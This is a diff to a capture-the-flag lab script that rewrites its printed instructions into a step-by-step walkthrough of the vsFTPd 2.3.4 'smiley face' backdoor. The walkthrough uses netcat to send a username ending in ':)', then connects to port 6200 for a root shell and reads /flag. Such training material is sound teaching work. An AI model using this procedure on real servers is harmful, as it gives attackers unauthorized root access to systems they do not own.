@@ -7,27 +7,71 @@ sys.path.append('/challenge')
 def print_instructions():
     print("""
     In this challenge, you will exploit a vulnerability in version 2.3.4 of vsFTPd, otherwise known as the
-    'smiley face' vulnerability. The FTP server should now be running. You can verify that is running by
-    running the 'ss -antop' command and looking for something like '127.0.0.1:21', which
-    indicates that the server is listening on TCP port 21.
+    'smiley face' vulnerability. This security flaw allows an attacker to gain unauthorized root access to a system 
+    simply by manipulating the username field during FTP login. FTP is a way to transfer files between computers 
+    over the internet, like moving documents between your computer and a website.
 
-    After you've verified that, use the 'nc' command (netcat) to connect to the server:
-          nc 127.0.0.1 21
+    - Step 1: Verify that the FTP server is running
+    The FTP server should now be active. To confirm this, run the following command:
 
-    Type 'USER test:)' and press enter. Notice the ':)' added to the end of the 'test' username.
-    When it asks for a password, type 'PASS test' (the password can be anything).
+        ss -antop
 
-    Then, in a new terminal, use the 'nc' command again to connect to port 6200, which should give you a root shell.
+    This command lists active network connections. Look for an entry similar to:
+
+            127.0.0.1:21
+
+    This indicates that the server is listening on TCP port 21, which is the standard port for FTP.
+
+    - Step 2: Connect to the FTP Server
+
+    Netcat is a command-line tool used to send and receive data over a network, often for testing connections, 
+    transferring files, or opening backdoor shells. You can use the 'nc' (netcat) command to connect to the FTP server 
+
+        nc 127.0.0.1 21
+
+    If the connection is successful, the server should respond with a greeting message.
+
+    - Step 3: Exploit the vulnerability 
+
+    You will now log in using a specially crafted username that triggers the backdoor. In your nc connection, type:
+
+        USER test:)
+
+    and press Enter. Notice the ':)' at the end of 'test' —this is what activates the malicious backdoor.
+
+    When prompted for a password, enter anything (it doesn’t matter). Example:
+
+        PASS test
+
+    - Step 4: Open a root shell
+
+    If the exploit worked, the server will open a new backdoor shell on port 6200. In a new terminal, run:
+
         nc 127.0.0.1 6200
 
-    Type 'whoami' to verify that you are the root user. It should show 'root'.
+    This should connect you to a root shell, giving you full administrative control over the system.
 
-    Congratulations! You have now exploited the vulnerability and can run commands as the root user, which means
-    you can read the flag yourself!
+    - Step 5: Verify root access
 
-    Inside the root shell, run 'cat /flag' to get your flag!
+    Once inside the shell, type:
+
+        whoami
+
+    If the exploit was successful, this command should return:
+
+        root
+
+    This confirms that you now have root privileges, meaning you can run any command on the system.
+
+    - Step 6: Capture the flag!
+
+    In the root shell, read the flag file by running:
+
         cat /flag
 
+    This will display the **flag**, completing your challenge!
+
+    Congratulations! You have successfully exploited the vsFTPd backdoor and gained root access.
     """)
 
 def start_vsftpd():
